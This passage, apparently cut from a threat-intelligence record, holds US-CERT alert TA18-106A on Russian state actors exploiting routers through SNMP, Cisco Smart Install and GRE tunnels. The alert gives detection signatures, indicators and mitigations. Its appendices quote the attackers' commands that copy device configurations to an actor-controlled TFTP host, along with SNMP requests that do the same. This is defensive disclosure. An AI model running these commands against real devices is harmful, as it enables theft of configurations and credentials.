Cisco. February 14, 2017. Updated October 30, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[10] Cisco Smart Install Protocol Misuse. Cisco. February 14, 2017. Updated October 30, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://csrc.nist.gov/Glossary/?term=401\">[11] NIST CSRC.</a></li>\n            \t\t    \t<li><a href=\"https://www.us-cert.gov/report-phishing\">[12] US-CERT. Report Phishing.</a></li>\n            \t\t    \t<li><a href=\"https://www.cnss.gov/CNSS/issuances/Instructions.cfm\">[13] CNSSI 4009-2015. </a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>April 16, 2018: Initial Version</li>\n\t\t    \t\t\t    \t<li>April 19, 2018: Added third-party reporting</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10836 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
					"source_name": "open source",
					"description": "Original release date: April 16, 2018 | Last revised: April 20, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <ul><li>Generic Routing Encapsulation (GRE) Enabled Devices</li><li>Cisco Smart Install (SMI) Enabled Devices</li><li>Simple Network Management Protocol (SNMP) Enabled Network Devices</li></ul>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p><strong>Update: </strong>On April 19, 2018, an industry partner notified NCCIC and the FBI of malicious cyber activity that aligns with the techniques, tactics, and procedures (TTPs) and network indicators listed in this Alert. Specifically, the industry partner reported the actors redirected DNS queries to their own infrastructure by creating GRE tunnels and obtained sensitive information, which include the configuration files of networked devices.</p><p>NCCIC encourages organizations to use the detection and prevention guidelines outlined in this Alert to help defend against this activity. For instance, administrators should inspect the presence of protocol 47 traffic flowing to or from unexpected addresses, or unexplained presence of GRE tunnel creation, modification, or destruction in log files.</p><p><strong>Original Post: </strong>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS), the Federal Bureau of Investigation (FBI), and the United Kingdom’s National Cyber Security Centre (NCSC). This TA provides information on the worldwide cyber exploitation of network infrastructure devices (e.g., router, switch, firewall, Network-based Intrusion Detection System (NIDS) devices) by Russian state-sponsored cyber actors. Targets are primarily government and private-sector organizations, critical infrastructure providers, and the Internet service providers (ISPs) supporting these sectors. This report contains technical details on the tactics, techniques, and procedures (TTPs) used by Russian state-sponsored cyber actors to compromise victims. Victims were identified through a coordinated series of actions between U.S. and international partners. This report builds on previous DHS reporting and advisories from the United Kingdom, Australia, and the European Union. [1-5] This report contains indicators of compromise (IOCs) and contextual information regarding observed behaviors on the networks of compromised victims. FBI has high confidence that Russian state-sponsored cyber actors are using compromised routers to conduct man-in-the-middle attacks to support espionage, extract intellectual property, maintain persistent access to victim networks, and potentially lay a foundation for future offensive operations.</p><p>DHS, FBI, and NCSC urge readers to act on past alerts and advisories issued by the U.S. and U.K. Governments, allied governments, network device manufacturers, and private-sector security organizations. Elements from these alerts and advisories have been selected and disseminated in a wide variety of security news outlets and social media platforms. The current state of U.S. network devices—coupled with a Russian government campaign to exploit these devices—threatens the safety, security, and economic well-being of the United States.</p><p>The purpose of this TA is to inform network device vendors, ISPs, public-sector organizations, private-sector corporations, and small office home office (SOHO) customers about the Russian government campaign, provide information to identify malicious activity, and reduce exposure to this activity.</p><p>For a downloadable copy of the IOC package, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/TA18-106A_TLP_WHITE.stix.xml\">TA18-106A_TLP_WHITE.stix.xml</a>.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Since 2015, the U.S. Government received information from multiple sources—including private and public sector cybersecurity research organizations and allies—that cyber actors are exploiting large numbers of enterprise-class and SOHO/residential routers and switches worldwide. The U.S. Government assesses that cyber actors supported by the Russian government carried out this worldwide campaign. These operations enable espionage and intellectual property theft that supports the Russian Federation’s national security and economic goals.</p><p><strong>Legacy Protocols and Poor Security Practice</strong></p><p>Russian cyber actors leverage a number of legacy or weak protocols and service ports associated with network administration activities. Cyber actors use these weaknesses to</p><ul><li>identify vulnerable devices;</li><li>extract device configurations;</li><li>map internal network architectures;</li><li>harvest login credentials;</li><li>masquerade as privileged users;</li><li>modify<ul><li>device firmware,</li><li>operating systems,</li><li>configurations; and</li></ul></li><li>copy or redirect victim traffic through Russian cyber-actor-controlled infrastructure.</li></ul><p>Additionally, Russian cyber actors could potentially modify or deny traffic traversing through the router.</p><p>Russian cyber actors do not need to leverage zero-day vulnerabilities or install malware to exploit these devices. Instead, cyber actors take advantage of the following vulnerabilities:</p><ul><li>devices with legacy unencrypted protocols or unauthenticated services,</li><li>devices insufficiently hardened before installation, and</li><li>devices no longer supported with security patches by manufacturers or vendors (end-of-life devices).</li></ul><p>These factors allow for both intermittent and persistent access to both intellectual property and U.S. critical infrastructure that supports the health and safety of the U.S. population.</p><p><strong>Own the Router, Own the Traffic</strong></p><p>Network devices are ideal targets. Most or all organizational and customer traffic must traverse these critical devices. A malicious actor with presence on an organization’s gateway router has the ability to monitor, modify, and deny traffic to and from the organization. A malicious actor with presence on an organization’s internal routing and switching infrastructure can monitor, modify, and deny traffic to and from key hosts inside the network and leverage trust relationships to conduct lateral movement to other hosts. Organizations that use legacy, unencrypted protocols to manage hosts and services, make successful credential harvesting easy for these actors. An actor controlling a router between Industrial Control Systems – Supervisory Control and Data Acquisition (ICS-SCADA) sensors and controllers in a critical infrastructure—such as the Energy Sector—can manipulate the messages, creating dangerous configurations that could lead to loss of service or physical destruction. Whoever controls the routing infrastructure of a network essentially controls the data flowing through the network.</p><p><strong>Network Devices—Often Easy Targets</strong></p><ul><li>Network devices are often easy targets. Once installed, many network devices are not maintained at the same security level as other general-purpose desktops and servers. The following factors can also contribute to the vulnerability of network devices:</li><li>Few network devices—especially SOHO and residential-class routers—run antivirus, integrity-maintenance, and other security tools that help protect general purpose hosts.</li><li>Manufacturers build and distribute these network devices with exploitable services, which are enabled for ease of installation, operation, and maintenance.</li><li>Owners and operators of network devices do not change vendor default settings, harden them for operations, or perform regular patching.</li><li>ISPs do not replace equipment on a customer’s property when that equipment is no longer supported by the manufacturer or vendor.</li><li>Owners and operators often overlook network devices when they investigate, examine for intruders, and restore general-purpose hosts after cyber intrusions.</li></ul>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p><strong>Stage 1: Reconnaissance</strong></p><p>Russian state-sponsored cyber actors have conducted both broad-scale and targeted scanning of Internet address spaces. Such scanning allows these actors to identify enabled Internet-facing ports and services, conduct device fingerprinting, and discover vulnerable network infrastructure devices. Protocols targeted in this scanning include</p><ul><li>Telnet (typically Transmission Control Protocol (TCP) port 23, but traffic can be directed to a wide range of TCP ports such as 80, 8080, etc.),</li><li>Hypertext Transport Protocol (HTTP, port 80),</li><li>Simple Network Management Protocol (SNMP, ports 161/162), and</li><li>Cisco Smart Install (SMI port 4786).</li></ul><p>Login banners and other data collected from enabled services can reveal the make and model of the device and information about the organization for future engagement.</p><p>Device configuration files extracted in previous operations can enhance the reconnaissance effort and allow these actors to refine their methodology.</p><p><strong>Stage 2: Weaponization and Stage 3: Delivery</strong></p><p>Commercial and government security organizations have identified specially crafted SNMP and SMI packets that trigger the scanned device to send its configuration file to a cyber-actor-controlled host via Trivial File Transfer Protocol (TFTP), User Datagram Protocol (UDP) port 69. [6-8] If the targeted network is blocking external SNMP at the network boundary, cyber actors spoof the source address of the SNMP UDP datagram as coming from inside the targeted network. The design of SMI (directors and clients) requires the director and clients to be on the same network. However, since SMI is an unauthenticated protocol, the source address for SMI is also susceptible to spoofing.</p><p>The configuration file contains a significant amount of information about the scanned device, including password hash values. These values allow cyber actors to derive legitimate credentials. The configuration file also contains SNMP community strings and other network information that allows the cyber actors to build network maps and facilitate future targeted exploitation.</p><p><strong>Stage 4: Exploitation</strong></p><p>Legitimate user masquerade is the primary method by which these cyber actors exploit targeted network devices. In some cases, the actors use brute-force attacks to obtain Telnet and SSH login credentials. However, for the most part, cyber actors are able to easily obtain legitimate credentials, which they then use to access routers. Organizations that permit default or commonly used passwords, have weak password policies, or permit passwords that can be derived from credential-harvesting activities, allow cyber actors to easily guess or access legitimate user credentials. Cyber actors can also access legitimate credentials by extracting password hash values from configurations sent by owners and operators across the Internet or by SNMP and SMI scanning.</p><p>Armed with the legitimate credentials, cyber actors can authenticate into the device as a privileged user via remote management services such as Telnet, SSH, or the web management interface.</p><p><strong>Stage 5: Installation</strong></p><p>SMI is an unauthenticated management protocol developed by Cisco. This protocol supports a feature that allows network administrators to download or overwrite any file on any Cisco router or switch that supports this feature. This feature is designed to enable network administrators to remotely install and configure new devices and install new OS files.</p><p>On November 18, 2016, a Smart Install Exploitation Tool (SIET) was posted to the Internet. The SIET takes advantage of the unauthenticated SMI design. Commercial and government security organizations have noted that Russian state-sponsored cyber actors have leveraged the SIET to abuse SMI to download current configuration files. Of concern, any actor may leverage this capability to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Additionally, these network devices have writeable file structures where malware for other platforms may be stored to support lateral movement throughout the targeted network.</p><p><strong>Stage 6: Command and Control</strong></p><p>Cyber actors masquerade as legitimate users to log into a device or establish a connection via a previously uploaded OS image with a backdoor. Once successfully logged into the device, cyber actors execute privileged commands. These cyber actors create a man-in-the-middle scenario that allows them to</p><ul><li>extract additional configuration information,</li><li>export the OS image file to an externally located cyber actor-controlled FTP server,</li><li>modify device configurations,</li><li>create Generic Routing Encapsulation (GRE) tunnels, or</li><li>mirror or redirect network traffic through other network infrastructure they control.</li></ul><p>At this stage, cyber actors are not restricted from modifying or denying traffic to and from the victim. Although there are no reports of this activity, it is technically possible.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p><strong>Telnet</strong></p><p>Review network device logs and netflow data for indications of TCP Telnet-protocol traffic directed at port 23 on all network device hosts. Although Telnet may be directed at other ports (e.g., port 80, HTTP), port 23 is the primary target. Inspect any indication of Telnet sessions (or attempts). Because Telnet is an unencrypted protocol, session traffic will reveal command line interface (CLI) command sequences appropriate for the make and model of the device. CLI strings may reveal login procedures, presentation of user credentials, commands to display boot or running configuration, copying files and creation or destruction of GRE tunnels, etc. See Appendices A and B for CLI strings for Cisco and other vendors’ devices.</p><p><strong>SNMP and TFTP </strong></p><p>Review network device logs and netflow data for indications of UDP SNMP traffic directed at port 161/162 on all network-device hosts. Because SNMP is a management tool, any such traffic that is not from a trusted management host on an internal network should be investigated. Review the source address of SNMP traffic for indications of addresses that spoof the address space of the network. Review outbound network traffic from the network device for evidence of Internet-destined UDP TFTP traffic. Any correlation of inbound or spoofed SNMP closely followed by outbound TFTP should be cause for alarm and further inspection. See Appendix C for detection of the cyber actors’ SNMP tactics.</p><p>Because TFTP is an unencrypted protocol, session traffic will reveal strings associated with configuration data appropriate for the make and model of the device. See Appendices A and B for CLI strings for Cisco and other vendor’s devices.</p><p><strong>SMI and TFTP</strong></p><p>Review network device logs and netflow data for indications of TCP SMI protocol traffic directed at port 4786 of all network-device hosts. Because SMI is a management feature, any traffic that is not from a trusted management host on an internal network should be investigated. Review outbound network traffic from the network device for evidence of Internet-destined UDP TFTP traffic. Any correlation of inbound SMI closely followed by outbound TFTP should be cause for alarm and further inspection. Of note, between June 29 and July 6, 2017, Russian actors used the SMI protocol to scan for vulnerable network devices. Two Russian cyber actors controlled hosts 91.207.57.69(3) and 176.223.111.160(4), and connected to IPs on several network ranges on port 4786. See Appendix D for detection of the cyber actors’ SMI tactics.</p><p>Because TFTP is an unencrypted protocol, session traffic will reveal strings appropriate for the make and model of the device. See Appendices A and B for CLI strings for Cisco and other vendors’ devices.</p><p><strong>Determine if SMI is present</strong></p><ul><li>Examine the output of “show vstack config | inc Role”. The presence of “Role: Client (SmartInstall enabled)” indicates that Smart Install is configured.</li><li>Examine the output of \"show tcp brief all\" and look for \"*:4786\". The SMI feature listens on tcp/4786.</li><li>Note: The commands above will indicate whether the feature is enabled on the device but not whether a device has been compromised.</li></ul><p><strong>Detect use of SMI</strong></p><p>The following signature may be used to detect SMI usage. Flag as suspicious and investigate SMI traffic arriving from outside the network boundary. If SMI is not used inside the network, any SMI traffic arriving on an internal interface should be flagged as suspicious and investigated for the existence of an unauthorized SMI director. If SMI is used inside the network, ensure that the traffic is coming from an authorized SMI director, and not from a bogus director.</p><ul><li>alert tcp any any -&gt; any 4786 (msg:\"Smart Install Protocol\"; flow:established,only_stream; content:\"|00 00 00 01 00 00 00 01|\"; offset:0; depth:8; fast_pattern;)</li><li>See Cisco recommendations for detecting and mitigating SMI. [<a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">9]</a></li></ul><p><strong>Detect use of SIET</strong></p><p>The following signatures detect usage of the SIET's commands change_config, get_config, update_ios, and execute. These signatures are valid based on the SIET tool available as of early September 2017:</p><ul><li>alert tcp any any -&gt; any 4786 (msg:\"SmartInstallExploitationTool_UpdateIos_And_Execute\"; flow:established; content:\"|00 00 00 01 00 00 00 01 00 00 00 02 00 00 01 c4|\"; offset:0; depth:16; fast_pattern; content:\"://\";)</li><li>alert tcp any any -&gt; any 4786 (msg:\"SmartInstallExploitationTool_ChangeConfig\"; flow:established; content:\"|00 00 00 01 00 00 00 01 00 00 00 03 00 00 01 28|\"; offset:0; depth:16; fast_pattern; content:\"://\";)</li><li>alert tcp any any -&gt; any 4786 (msg: \"SmartInstallExploitationTool_GetConfig\"; flow: established; content:\"|00 00 00 01 00 00 00 01 00 00 00 08 00 00 04 08|\"; offset:0; depth:16; fast_pattern; content:\"copy|20|\";)</li></ul><p>In general, exploitation attempts with the SIET tool will likely arrive from outside the network boundary. However, before attempting to tune or limit the range of these signatures, i.e. with $EXTERNAL_NET or $HOME_NET, it is recommended that they be deployed with the source and destination address ranges set to “any”. This will allow the possibility of detection of an attack from an unanticipated source, and may allow for coverage of devices outside of the normal scope of what may be defined as the $HOME_NET.</p><p><strong>GRE Tunneling</strong></p><p>Inspect the presence of protocol 47 traffic flowing to or from unexpected addresses, or unexplained presence of GRE tunnel creation, modification, or destruction in log files.</p><p><strong>Mitigation Strategies</strong></p><p>There is a significant amount of publically available cybersecurity guidance and best practices from DHS, allied government, vendors, and the private-sector cybersecurity community on mitigation strategies for the exploitation vectors described above. The following are additional mitigations for network device manufacturers, ISPs, and owners or operators.</p><p><strong>General Mitigations</strong></p><p><u>All</u></p><ul><li>Do not allow unencrypted (i.e., plaintext) management protocols (e.g. Telnet) to enter an organization from the Internet. When encrypted protocols such as SSH, HTTPS, or TLS are not possible, management activities from outside the organization should be done through an encrypted Virtual Private Network (VPN) where both ends are mutually authenticated.</li><li>Do not allow Internet access to the management interface of any network device. The best practice is to block Internet-sourced access to the device management interface and restrict device management to an internal trusted and whitelisted host or LAN. If access to the management interface cannot be restricted to an internal trusted network, restrict remote management access via encrypted VPN capability where both ends are mutually authenticated. Whitelist the network or host from which the VPN connection is allowed, and deny all others.</li><li>Disable legacy unencrypted protocols such as Telnet and SNMPv1 or v2c. Where possible, use modern encrypted protocols such as SSH and SNMPv3. Harden the encrypted protocols based on current best security practice. DHS strongly advises owners and operators to retire and replace legacy devices that cannot be configured to use SNMP V3.</li><li>Immediately change default passwords and enforce a strong password policy. Do not reuse the same password across multiple devices. Each device should have a unique password. Where possible, avoid legacy password-based authentication, and implement two-factor authentication based on public-private keys. See NCCIC/US-CERT TA13-175A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\">Risks of Default Passwords on the Internet</a>, last revised October 7, 2016.</li></ul><p><u>Manufacturers</u></p><ul><li>Do not design products to support legacy or unencrypted protocols. If this is not possible, deliver the products with these legacy or unencrypted protocols disabled by default, and require the customer to enable the protocols after accepting an interactive risk warning. Additionally, restrict these protocols to accept connections only from private addresses (i.e., RFC 1918).</li><li>Do not design products with unauthenticated services. If this is not possible, deliver the products with these unauthenticated services disabled by default, and require the customer to enable the services after accepting an interactive risk warning. Additionally, these unauthenticated services should be restricted to accept connections only from private address space (i.e., RFC 1918).</li><li>Design installation procedures or scripts so that the customer is required to change all default passwords. Encourage the use of authentication services that do not depend on passwords, such as RSA-based Public Key Infrastructure (PKI) keys.</li><li>Because YARA has become a security-industry standard way of describing rules for detecting malicious code on hosts, consider embedding YARA or a YARA-like capability to ingest and use YARA rules on routers, switches, and other network devices.</li></ul><p><u>Security Vendors</u></p><ul><li>Produce and publish YARA rules for malware discovered on network devices.</li></ul><p><u>ISPs</u></p><ul><li>Do not field equipment in the network core or to customer premises with legacy, unencrypted, or unauthenticated protocols and services. When purchasing equipment from vendors, include this requirement in purchase agreements.</li><li>Disable legacy, unencrypted, or unauthenticated protocols and services. Use modern encrypted management protocols such as SSH. Harden the encrypted protocols based on current best security practices from the vendor.</li><li>Initiate a plan to upgrade fielded equipment no longer supported by the vendor with software updates and security patches. The best practice is to field only supported equipment and replace legacy equipment prior to it falling into an unsupported state.</li><li>Apply software updates and security patches to fielded equipment. When that is not possible, notify customers about software updates and security patches and provide timely instructions on how to apply them.</li></ul><p><u>Owners or operators</u></p><ul><li>Specify in contracts that the ISP providing service will only field currently supported network equipment and will replace equipment when it falls into an unsupported state.</li><li>Specify in contracts that the ISP will regularly apply software updates and security patches to fielded network equipment or will notify and provide the customers the ability to apply them.</li><li>Block TFTP from leaving the organization destined for Internet-based hosts. Network devices should be configured to send configuration data to a secured host on a trusted segment of the internal management LAN.</li><li>Verify that the firmware and OS on each network device are from a trusted source and issued by the manufacturer. To validate the integrity of network devices, refer to the vendor’s guidance, tools, and processes. See <a href=\"https://www.cisco.com/c/en/us/about/security-center/ios-image-verification.html\">Cisco’s Security Center</a> for guidance to validate Cisco IOS firmware images.</li><li>Cisco IOS runs in a variety of network devices under other labels, such as Linksys and SOHO Internet Gateway routers or firewalls as part of an Internet package by ISPs (e.g., Comcast). The indicators in Appendix A may be applicable to your device.</li></ul><p><strong>Detailed Mitigations</strong></p><p>Refer to the vendor-specific guidance for the make and model of network device in operation.</p><p><strong>For information on mitigating SNMP vulnerabilities, see</strong></p><ul><li>NCCIC/US-CERT Alert TA17-156A –<a href=\"https://www.us-cert.gov/ncas/alerts/TA17-156A\"> Reducing the Risk of SNMP Abuse</a>, June 5, 2017, and</li><li>NCCIC/US-CERT Alert TA16-250A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-250A\">The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations</a>, September 6, 2016 Updated September 28, 2016.</li></ul><p><strong>How to Mitigate SMI Abuse</strong></p><ul><li>Configure network devices before installing onto a network exposed to the Internet. If SMI must be used during installation, disable SMI with the “no vstack” command before placing the device into operation.</li><li>Prohibit remote devices attempting to cross a network boundary over TCP port 4786 via SMI.</li><li>Prohibit outbound network traffic to external devices over UDP port 69 via TFTP.</li><li>See Cisco recommendations for detecting and mitigating SMI. <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi\">[10]</a></li><li>Cisco IOS runs in a variety of network devices under other labels, such as Linksys and SOHO Internet Gateway routers or firewalls as part of an Internet package by ISPs (e.g., Comcast). Check with your ISP and ensure that they have disabled SMI before or at the time of installation, or obtain instructions on how to disable it.</li></ul><p><strong>How to Mitigate GRE Tunneling Abuse:</strong></p><ul><li>Verify that all routing tables configured in each border device are set to communicate with known and trusted infrastructure.</li><li>Verify that any GRE tunnels established from border routers are legitimate and are configured to terminate at trusted endpoints.</li></ul><p> </p><h2><strong>Definitions </strong></h2><p><strong>Operating System Fingerprinting </strong>is analyzing characteristics of packets sent by a target, such as packet headers or listening ports, to identify the operating system in use on the target. <a href=\"https://csrc.nist.gov/Glossary/?term=401\">[11]</a></p><p><strong>Spear phishing</strong> is an attempt by an individual or group to solicit personal information from unsuspecting users by employing social engineering techniques. Phishing emails are crafted to appear as if they were sent from a legitimate organization or known individual. These emails often attempt to entice users to click on a link that will take the user to a fraudulent website that appears legitimate. The user then may be asked to provide personal information, such as account usernames and passwords, which can further expose them to future compromises. <a href=\"https://www.us-cert.gov/report-phishing\">[12]</a></p><p>In a <strong>watering hole attack</strong>, the attacker compromises a site likely to be visited by a particular target group, rather than attacking the target group directly. <a href=\"https://www.cnss.gov/CNSS/issuances/Instructions.cfm\">[13]</a></p><p> </p><h2><strong>Report Notice</strong></h2><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to NCCIC or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at NCCICcustomerservice@hq.dhs.gov or 888-282-0870 and the FBI through a local field office or the FBI’s Cyber Division at CyWatch@fbi.gov or 855-292-3937. To request information from or report cyber incidents to UK authorities, contact NCSC at www.ncsc.gov.uk/contact.</p><p> </p><h2>Appendix A: Cisco Related Command and Configuration Strings</h2><p><strong>Command Strings.</strong></p><p>Commands associated with Cisco IOS. These strings may be seen in inbound network traffic of unencrypted management tools such as Telnet or HTTP, in the logs of application layer firewalls, or in the logs of network devices. Network device owners and operators should review the Cisco documentation of their particular makes and models for strings that would allow the owner or operator to customize the list for an Intrusion Detection System (IDS). Detecting commands from Internet-based hosts should be a cause for concern and further investigation. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.</p><p>Strings:</p><div style=\"background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;\">'sh arp'           <br />'sho arp'           <br />'show arp'<br />'sh bgp sum'       <br />'sho bgp sum'       <br />'show bgp sum'<br />'sh cdp'           <br />'sho cdp'           <br />'show cdp'<br />'sh con'           <br />'sho con'<br />'show con'<br />'sh ip route'     <br />'sho ip route'      <br />'show ip route'<br />'sh inv'           <br />'sho inv'           <br />'show inv'<br />'sh int'           <br />'sho int'           <br />'show int'<br />'sh nat trans'    <br />'sho nat trans'     <br />'show nat trans'<br />'sh run'           <br />'sho run'           <br />'show run'<br />'sh ver'           <br />'sho ver'           <br />'show ver'<br />'sh isis'          <br />'sho isis'          <br />'show isis'<br />'sh rom-monitor'   <br />'sho rom-monitor'   <br />'show rom-monitor'<br />'sh startup-config'<br />'sho startup-config'<br />'show startup-config'<br />'sh boot'          <br />'sho boot'          <br />'show boot'<br />'enable'          <br />'enable secret'</div><p><strong>Configuration Strings.</strong></p><p>Strings associated with Cisco IOS configurations may be seen in the outbound network traffic of unencrypted management tools such as Telnet, HTTP, or TFTP. This is a subset of the possible strings. Network device owners and operators should export the configuration of their particular makes and models to a secure host and examine it for strings that would allow the owner or operator to customize the list for an IDS. Detecting outbound configuration data leaving an organization destined for Internet-based hosts should be a cause for concern and further investigation to ensure the destination is authorized to receive the configuration data. Because configuration data provides an adversary with information—such as the password hashes—to enable future attacks, configuration data should be encrypted between sender and receiver. Outbound configuration files may be triggered by SNMP queries and Cisco Smart Install commands. In such cases, the outbound file would be sent via TFTP. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.</p><p>Strings:</p><div style=\"background: rgb(238, 238, 238); padding: 5px 10px; border: 1px solid rgb(204, 204, 204); border-image: none;\">aaa new-model<br />advertisement version<br />BGP router identifier<br />boot system flash:<br />Building configuration?<br />Cisco Internetwork Operating System<br />Cisco IOS Software,<br />Configuration register<br />www.cisco.com/techsupport<br />Codes C ? connected, S ? static<br />configuration memory<br />Current configuration :<br />boot-start-marker<br />! Last configuration change at <br />! NVRAM config last updated at <br />interface VLAN<br />interface FastEthernet<br />interface GigabitEthernet<br />interface pos<br />line protocol is<br />loopback not set<br />ip access-list extended<br />nameif outside<br />Routing Bit Set on this LSA<br />route source<br />router bgp<br />router ospf<br />routing table<br />ROM: Bootstrap program is<br />snmp-server<br />system bootstrap<br />System image file is<br />PIX VERSION<br />ASA VERSION<br />(ASA)<br />boot-start-marker<br />boot system flash<br />boot end-marker<br />BOOT path-list</div><p> </p><h2>Appendix B: Other Vendor Command and Configuration Strings</h2><p>Russian state-sponsored cyber actors could potentially target the network devices from other manufacturers. Therefore, operators and owners should review the documentation associated with the make and model they have in operation to identify strings associated with administrative functions. Export the current configuration and identify strings associated with the configuration. Place the device-specific administrative and configuration strings into network-based and host-based IDS. Examples for Juniper JUNOS may include: “enable”, ”reload”, ”show”, ”set”, ”unset” ”file copy”, or ”request system scripts” followed by other expected parameters. Examples for MicroTic may include: “ip”, ”interface”, ”firewall”, ”password”, or ”ping”. See the documentation for your make and model for specific strings and parameters to place on watch.</p><p>These strings may be seen in inbound network traffic of unencrypted management tools such as Telnet or HTTP, in the logs of application layer firewalls or network devices. Detecting commands from Internet-based hosts should be a cause for concern and further investigation. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.</p><p>The following are important functions to monitor:</p><ul><li>login</li><li>displaying or exporting the current configuration</li><li>copying files from the device to another host, especially a host outside the LAN or one not previously authorized</li><li>copying files to the device from another host, especially a host outside the LAN or one not previously authorized</li><li>changes to the configuration</li><li>creation or destruction of GRE tunnels</li></ul><p> </p><h2>Appendix C: SNMP Queries</h2><ul><li>SNMP query containing any of the following from an external host<ul><li>show run</li><li>show ip arp</li><li>show version</li><li>show ip route</li><li>show neighbor detail</li><li>show interface</li></ul></li><li>SNMP Command ID 1.3.6.1.4.1.9.9.96 with the TFTP server IP parameter of “80.255.3.85”</li><li>SNMP and Cisco's \"config copy\" management information base (MIB) object identifiers (OIDs) Command ID  1.3.6.1.4.1.9.9.96 with the TFTP server IP parameter of “87.120.41.3” and community strings of ”public” ”private” or ”anonymous”</li></ul><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"general-table\" style=\"width: 600px; height: 312px;\"><thead><tr><th scope=\"col\">OID Name</th><th scope=\"col\">OID Value</th><th scope=\"col\">Meaning</th></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.2</td><td scope=\"col\" style=\"text-align: left;\">1</td><td scope=\"col\" style=\"text-align: left;\">Protocol type = TFTP</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.3</td><td scope=\"col\" style=\"text-align: left;\">1</td><td scope=\"col\" style=\"text-align: left;\">Source file type = network file</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.4</td><td scope=\"col\" style=\"text-align: left;\">4</td><td scope=\"col\" style=\"text-align: left;\">Destination file type = running config</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.5</td><td scope=\"col\" style=\"text-align: left;\">87.120.41.3</td><td scope=\"col\" style=\"text-align: left;\">TFTP server IP = 87.120.41.3</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.6</td><td scope=\"col\" style=\"text-align: left;\">backup</td><td scope=\"col\" style=\"text-align: left;\">File name = backup</td></tr><tr><td scope=\"col\" style=\"text-align: left;\">1.3.6.1.4.1.9.9.96.1.1.1.1.14</td><td scope=\"col\" style=\"text-align: left;\">4</td><td scope=\"col\" style=\"text-align: left;\">Activate the status of the table entry</td></tr></thead></table><ul><li>SNMP Command ID 1.3.6.1.4.1.9.9.96 with the TFTP server IP parameter 80.255.3.85</li><li>SNMP v2c and v1 set-requests with the OID 1.3.6.1.4.1.9.2.1.55 with the TFTP server IP parameter “87.120.41.3”, using community strings “private” and “anonymous”</li><li>The OID 1.3.6.1.4.1.9.2.1.55.87.120.41.3 is a request to transfer a copy of a router's configuration to the IP address specified in the last four octets of the OID, in this case 87.120.41.3.</li><li>Since late July 2016, 87.120.41.3 has been scanning thousands of IPs worldwide using SNMP.</li><li>Between November 21 and 22, 2016, Russian cyber actors attempted to scan using SNMP version 2 Object Identifier (OID) 1.3.6.1.4.9.9.96.1.1.1.1.5 with a value of 87.120.41.3 and a community string of “public”. This command would cause vulnerable devices to exfiltrate configuration data to a specified IP address over TFTP; in this case, IP address 87.120.41.3.</li><li>SNMP, TFTP, HTTP, Telnet, or SSH traffic to or from the following IPs<ul><li>210.245.123.180</li></ul></li></ul><p> </p><h2>Appendix D: SMI Queries</h2><p>Between June 29 and July 6, 2017, Russian actors used the Cisco Smart Install protocol to scan for vulnerable network devices. Two Russian cyber actor-controlled hosts, 91.207.57.69(3) and 176.223.111.160(4), connected to IPs on several network ranges on port 4786 and sent the following two commands:</p><ul><li>copy nvram:startup-config flash:/config.text</li><li>copy nvram:startup-config tftp://[actor address]/[actor filename].conf</li></ul><p>In early July 2017, the commands sent to targets changed slightly, copying the running configuration file instead of the startup configuration file. Additionally, the second command copies the file saved to flash memory instead of directly copying the configuration file.</p><ul><li>copy system:running-config flash:/config.text</li><li>copy flash:/config.text tftp://[ actor address]/[actor filename].conf</li></ul>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://cyber.dhs.gov/assets/report/ar-16-20173.pdf\">[1] The Increasing Threat to Network Infrastructure Devices and Recommended Mitigations. DHS. AR-16-20173. August 30, 2016.</a></li>\n            \t\t    \t<li><a href=\"http://cert.europa.eu/static/SecurityAdvisories/2017/CERT-EU-SA2017-003.pdf\">[2] Cisco Smart Install Protocol Issues. CERT-EU. Advisory 2017-003. February 22, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.ncsc.gov.uk/guidance/internet-edge-device-security\">[3] Internet Edge Device Security. United Kingdom. National Cyber Security Centre. May 12, 2017.</a></li>\n            \t\t    \t<li><a href=\"https://www.ncsc.gov/uk/information/uk-internet-edge-router-devices-advisory\">[4] UK Internet 